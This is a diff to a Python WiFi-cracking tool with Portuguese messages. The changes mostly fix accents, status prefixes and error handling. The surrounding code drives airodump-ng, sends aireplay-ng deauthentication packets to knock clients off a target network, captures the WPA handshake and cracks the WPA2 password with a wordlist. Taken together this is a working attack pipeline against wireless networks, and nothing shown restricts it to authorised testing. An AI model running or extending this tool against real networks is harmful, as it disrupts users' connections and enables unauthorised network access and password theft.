@@ -37,7 +37,7 @@ class WiFiCracker:
         self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
     def check_monitor_mode(self) -> bool:
-        """Verifica se interface esta em modo monitor"""
+        """Verifica se interface está em modo monitor"""
         try:
             result = subprocess.run(
                 ["iwconfig", self.monitor_iface],
@@ -45,16 +45,20 @@ class WiFiCracker:
                 text=True,
                 timeout=5
             )
+            if result.returncode != 0:
+                print(f"[!] Interface {self.monitor_iface} não encontrada!")
+                return False
             return "Monitor" in result.stdout
-        except:
-            print(f" Interface {self.monitor_iface} no encontrada!")
-            print("Activate monitor mode:")
-            print(f"  sudo airmon-ng start wlan0")
+        except FileNotFoundError:
+            print("[!] iwconfig não encontrado. Instalar: sudo pacman -S wireless_tools")
+            return False
+        except Exception:
+            print(f"[!] Interface {self.monitor_iface} não encontrada!")
             return False
     
     def scan_networks(self, timeout: int = 30) -> List[Dict]:
-        """Escaneia redes WiFi disponveis"""
-        print(f" Escaneando redes por {timeout}seg...")
+        """Escaneia redes WiFi disponíveis"""
+        print(f"[*] Escaneando redes por {timeout}seg...")
         
         capture_file = f"{self.output_dir}/scan_{self.timestamp}.cap"
         
@@ -76,7 +80,7 @@ class WiFiCracker:
             
             return networks
         except Exception as e:
-            print(f" Erro ao escanear: {e}")
+            print(f"[!] Erro ao escanear: {e}")
             return []
     
     def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
@@ -112,7 +116,7 @@ class WiFiCracker:
     
     def capture_handshake(self, bssid: str, essid: str, timeout: int = 120) -> bool:
         """Captura WPA handshake forcando reconexo"""
-        print(f" Capturando handshake para {essid} ({bssid})...")
+        print(f"[*] Capturando handshake para {essid} ({bssid})...")
         
         capture_file = f"{self.output_dir}/handshake_{essid}_{self.timestamp}"
         
@@ -128,7 +132,7 @@ class WiFiCracker:
             time.sleep(5)
             
             # Forar desconexo com aireplay-ng (deauth attack)
-            print(f"    Enviando deauth packets (desligando clientes)...")
+            print(f"[*] Enviando deauth packets (desligando clientes)...")
             for i in range(3):
                 subprocess.run(
                     ["sudo", "aireplay-ng", "-0", "5", "-a", bssid, self.monitor_iface],
@@ -139,7 +143,7 @@ class WiFiCracker:
                 time.sleep(3)
             
             # Esperar captura
-            print(f"   Aguardando handshake (mx {timeout}seg)...")
+            print(f"[*] Aguardando handshake (máx {timeout}seg)...")
             start = time.time()
             
             while time.time() - start < timeout:
@@ -153,18 +157,18 @@ class WiFiCracker:
                         timeout=5
                     )
                     if "1 handshake" in result.stdout or "WPA" in result.stdout:
-                        print(f"   Handshake capturado!")
+                        print(f"[+] Handshake capturado!")
                         airodump.terminate()
                         return cap_file
                 
                 time.sleep(2)
             
-            print(f"   Timeout - handshake no capturado")
+            print(f"[!] Timeout - handshake não capturado")
             airodump.terminate()
             return None
             
         except Exception as e:
-            print(f" Erro ao capturar: {e}")
+            print(f"[!] Erro ao capturar: {e}")
             return None
     
     def crack_password(self, cap_file: str, bssid: str, essid: str, 
@@ -172,13 +176,13 @@ class WiFiCracker:
         """Cracka password WPA2 usando wordlist"""
         
         if not os.path.exists(wordlist):
-            print(f"  Wordlist no encontrada: {wordlist}")
-            print(f"  Criar com: python tools/wordlist_generator.py")
+            print(f"[!] Wordlist não encontrada: {wordlist}")
+            print(f"    Criar com: python tools/wordlist_generator.py")
             return None
         
-        print(f" Cracking {essid}...")
-        print(f"  Usando: {wordlist}")
-        print(f"  Handshake: {cap_file}")
+        print(f"[*] Cracking {essid}...")
+        print(f"    Usando: {wordlist}")
+        print(f"    Handshake: {cap_file}")
         
         try:
             result = subprocess.run(
@@ -193,19 +197,19 @@ class WiFiCracker:
                 if "KEY FOUND!" in line:
                     # Extract password
                     password = line.split('[')[-1].split(']')[0]
-                    print(f"   PASSWORD ENCONTRADA: {password}")
+                    print(f"[+] PASSWORD ENCONTRADA: {password}")
                     return password
                 elif "Parsing" in line or "Testing" in line:
-                    print(f"  {line}")
+                    print(f"    {line}")
             
-            print(f"   Password no encontrada na wordlist")
+            print(f"[-] Password não encontrada na wordlist")
             return None
             
         except subprocess.TimeoutExpired:
-            print(f"   Timeout aps 5 minutos")
+            print(f"[!] Timeout após 5 minutos")
             return None
         except Exception as e:
-            print(f"   Erro: {e}")
+            print(f"[!] Erro: {e}")
             return None
     
     def save_results(self, results: Dict):
